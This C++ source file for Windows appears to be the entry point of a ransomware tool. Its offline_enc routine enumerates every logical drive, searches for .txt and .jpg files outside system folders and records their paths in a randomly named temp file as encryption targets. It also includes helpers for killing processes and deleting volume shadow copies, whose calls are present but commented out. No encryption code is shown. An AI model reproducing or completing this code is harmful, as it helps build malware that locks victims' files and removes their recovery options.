#include <iostream>
#include <Windows.h>
#include "Core/disk_id.h"
#include "Core/file_search.h"
#include "Helpers/convert_to_wstring.h"
#include "Helpers/save_results.h"
#include "Helpers/gen_str.h"
#include "Helpers/kill_procs.h"
#include "Helpers/del_shadows.h"


int offline_enc();
int online_enc();



int main() {
    offline_enc();

    return 0;
}


int offline_enc() {
    // identify all drives
    std::map<std::string, std::vector<std::wstring>> drives = Disk_ID();
    // store all logical drives to an array
    std::vector<std::wstring> logicalDrives = drives["logical"];

    // generate a unique wstring:
    std::string randomTempStr = gen_str(8);
    std::wstring randomWStr(randomTempStr.begin(), randomTempStr.end());

    // path to temp directory
    WCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    std::wstring wstrTempPath(tempPath);
    // path to a text file for storing file paths
    std::wstring filePath = wstrTempPath + L"\\" + randomWStr + L".txt";

    // search for files in each drive & ignore forbidden folders 
    std::vector<std::wstring> fileTypes = { L".txt", L".jpg" };
    std::unordered_set<std::wstring> forbiddenDirs = { L"System Volume Information", L"Windows", L"Program Files", L"Users", 
                                                        L"PerfLogs", L"Recovery", L"Path", L"Program Files (x86)", L"$Recycle.Bin"};

    for (const auto& drive : logicalDrives) {
        std::vector<std::wstring> files = FileSearcher(drive, fileTypes, forbiddenDirs);
        SaveResultsToFile(filePath, files); 
    }
    
    // KillProcs();
    // nuke_vss();

    return 0;
}